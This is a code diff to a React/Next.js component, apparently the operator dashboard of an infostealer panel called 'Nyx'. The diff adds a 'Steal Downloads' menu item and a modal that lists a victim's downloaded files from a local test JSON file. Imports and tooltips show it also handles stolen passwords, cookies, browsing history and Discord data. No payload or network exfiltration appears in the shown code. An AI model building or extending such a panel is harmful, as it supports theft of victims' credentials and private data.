@@ -10,6 +10,7 @@ import Data from "@/data/teste.json";
 import Data2 from "@/data/teste-senhas.json";
 import Data3 from '@/data/teste-cookies.json'
 import Data4 from '@/data/teste-history.json'
+import Data5 from '@/data/teste-downloads.json'
 import { useParams, useRouter } from "next/navigation";
 import Footer from "./footer/footer";
 
@@ -67,6 +68,13 @@ interface History2{
 
 }
 
+interface Downloads{
+  id:number;
+  fileName:string;
+  fileSize:string;
+  downloadDate:string
+}
+
 interface networkDetails {
   macAdress: string;
   subnetMask: string;
@@ -111,8 +119,8 @@ export default function Component() {
   const users: User[] = Data;
   const senhas: Senhas[] = Data2;
   const biscoitos: Cookies[] = Data3;
-  const history: History2[]  = Data4;
   const history2: History1[] = Data4.flatMap(item => item.history);
+  const dl: Downloads[] = Data5;
 
   const userInfo = {
     name: "Faccin",
@@ -382,6 +390,41 @@ export default function Component() {
 
 
 
+
+function ModalDownloads() {
+  const [isDownloadsOpen,setIsDownloadsOpen] = useState<boolean>(false)
+  const handleCloseDL = () => {
+    setIsDownloadsOpen(false)
+  } 
+  return(
+    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
+    <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto space-y-6">
+      <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
+        <Image src={logo} alt="Nyx Logo" width={700} height={700} />
+      </div>
+      {/* BotÃ£o de fechar */}
+
+      <button
+        onClick={handleCloseDL}
+        className=" self-start text-red-700"
+      >
+        CLOSE
+      </button>
+      <h1 className="text-3xl font-bold text-center">Donwloads</h1>
+      <div>
+      {dl.map(({id,fileName,fileSize,downloadDate})=>(
+        <div key={id}>
+            <h2>{fileName}</h2>
+            <h3>{fileSize}</h3>
+            <p>{downloadDate}</p>
+        </div>
+      ))}
+      </div>
+    </div>
+  </div>
+  )
+}
+
   function ModalHistory() {
   const [isHistoryOpen, setIsHistoryOpen] = useState<boolean>(false)
   const handleCloseHistory = () =>{
@@ -500,7 +543,11 @@ export default function Component() {
     const [isModalOpenSenha, setIsModalOpenSenha] = useState<boolean>(false);
     const [isCookiesOpen, setIsCookiesOpen] = useState<boolean>(false);
     const [isHistoryOpen, setIsHistoryOpen] = useState<boolean>(false)
-
+    const [isDownloadsOpen,setIsDownloadsOpen] = useState<boolean>(false)
+    
+    const handleOpenDL = () => {
+      setIsDownloadsOpen(true)
+    } 
 
     const handleOpenHistory = () =>{
       setIsHistoryOpen(true)
@@ -511,6 +558,8 @@ export default function Component() {
     const handleOpenModalSenha = () => {
       setIsModalOpenSenha(true);
     };
+
+    
     return (
       <div
         ref={contextMenuRef}
@@ -583,8 +632,14 @@ export default function Component() {
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Downloads">
+                  <p onClick={handleOpenDL}>
+
                   Steal Downloads
+                  </p>
                 </abbr>
+                <div>
+                  {isDownloadsOpen && <ModalDownloads/>}
+                </div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Discord">
